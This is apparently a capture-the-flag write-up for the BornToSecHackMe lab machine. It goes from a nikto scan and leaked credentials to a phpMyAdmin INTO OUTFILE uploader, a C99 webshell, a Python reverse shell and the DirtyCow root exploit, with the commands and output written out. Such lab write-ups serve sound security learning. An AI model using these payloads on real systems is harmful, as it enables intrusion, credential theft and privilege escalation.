# Web

```shell
$ nikto -h http://192.168.56.143/
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.56.143
+ Target Hostname:    192.168.56.143
+ Target Port:        80
+ Start Time:         2022-07-11 17:29:41 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, inode: 13650, size: 1025, mtime: 0x5218c3c475880
+ The anti-clickjacking X-Frame-Options header is not present.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3233: /icons/README: Apache default file found.
+ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2022-07-11 17:29:48 (GMT2) (7 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


$ nikto -h https://192.168.56.143/
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          192.168.56.143
+ Target Hostname:    192.168.56.143
+ Target Port:        443
---------------------------------------------------------------------------
+ SSL Info:        Subject: /CN=BornToSec
                   Ciphers: ECDHE-RSA-AES256-GCM-SHA384
                   Issuer:  /CN=BornToSec
+ Start Time:         2022-07-11 17:21:22 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.2.22 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ Hostname '192.168.56.143' does not match certificate's CN 'BornToSec'
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ Retrieved x-powered-by header: PHP/5.3.10-1ubuntu3.20
+ Cookie PHPSESSID created without the secure flag
+ Cookie PHPSESSID created without the httponly flag
+ Cookie mlf2_usersettings created without the secure flag
+ Cookie mlf2_usersettings created without the httponly flag
+ Cookie mlf2_last_visit created without the secure flag
+ Cookie mlf2_last_visit created without the httponly flag
+ OSVDB-3092: /forum/: This might be interesting...
+ Cookie phpMyAdmin created without the httponly flag
+ Cookie SQMSESSID created without the secure flag
+ Cookie SQMSESSID created without the httponly flag
+ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
+ OSVDB-3093: /webmail/src/read_body.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ Server leaks inodes via ETags, header found with file /icons/README, inode: 47542, size: 5108, mtime: 0x438c0358aae80
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ 6544 items checked: 0 error(s) and 19 item(s) reported on remote host
+ End Time:           2022-07-11 17:23:28 (GMT2) (126 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

```
+ OSVDB-3092: /forum/: This might be interesting...
+ OSVDB-3093: /webmail/src/read_body.php: This might be interesting... has been seen in web logs from an unknown scanner.
+ /phpmyadmin/: phpMyAdmin directory found
```
So we have three routes in https:
```
https://192.168.56.143/forum
https://192.168.56.143/webmail
https://192.168.56.143/phpmyadmin
```

## Forum
In `https://192.168.56.143/forum/` we find the `Probleme login?` Thread of 
`lmezard` in which he writes a log of his access, in fact we find something 
interesting:
```
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by
```
he appears to have accidentally typed the password into the user field, actually 
entering `!q\]Ej?*5K5cy*AJ` as the password and `lmezard` as the user, the 
password is correct.

Unfortunately nothing else is found in the forum, so I switch to the `webmail` 
route because `phpmyadmin` is obviously password protected.

## Webmail
We only have the password of the user `lmezard` so I try to enter his email 
(previously taken from the forum info) and the same password.
```
email:     laurie@borntosec.net
password:  !q\]Ej?*5K5cy*AJ
```
It works, and we find the following email from `qudevide@mail.borntosec.net`:
```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```
So now we also have the `phpmyadmin` password.

After several tests in the default folders of the services on the server, I finally find the 'templates_c' folder where you can upload a file. So I use the following query to load a simple page that will allow me to load a webshell later (I chose the C99 as it offers many options `https://raw.githubusercontent.com/cermmik/C99-WebShell/master/c99shell.php`)

```
SELECT 
"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
INTO OUTFILE '/var/www/forum/templates_c/uploader.php';
```

So through C99 we start a reverse shell with python:
(`https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md`)
```
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.101",4222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

And I execute the commands:
```shell
curl -k https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```
So through linux-exploit-suggester we know which exploits are available on this version of the Linux Kernel.
The first recommended exploit is dirtycow: `https://www.exploit-db.com/exploits/40839`
```shell
$ curl -k https://www.exploit-db.com/raw/40839 -o dirty.c
$ sed -i 's/user.username = \"firefart\"/user.username = \"root\"/g' dirty.c
$ gcc -pthread dirty.c -o dirty -lcrypt
$ ./dirty usavoia
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: usavoia
Complete line:
root:fi92lWcwqRO3o:0:0:pwned:/root:/bin/bash

mmap: b7fda000
madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'usavoia'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'root' and the password 'usavoia'.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd

$ su
su
Password: usavoia

root@BornToSecHackMe:/var/www/forum/templates_c# id
id
uid=0(root) gid=0(root) groups=0(root)
root@BornToSecHackMe:/var/www/forum/templates_c# cd
cd
root@BornToSecHackMe:~# ls -l
ls -l
total 1
-rw-r--r-- 1 root root 40 Oct 15  2015 README
root@BornToSecHackMe:~# cat README
cat README
CONGRATULATIONS !!!!
To be continued...
root@BornToSecHackMe:~#
```
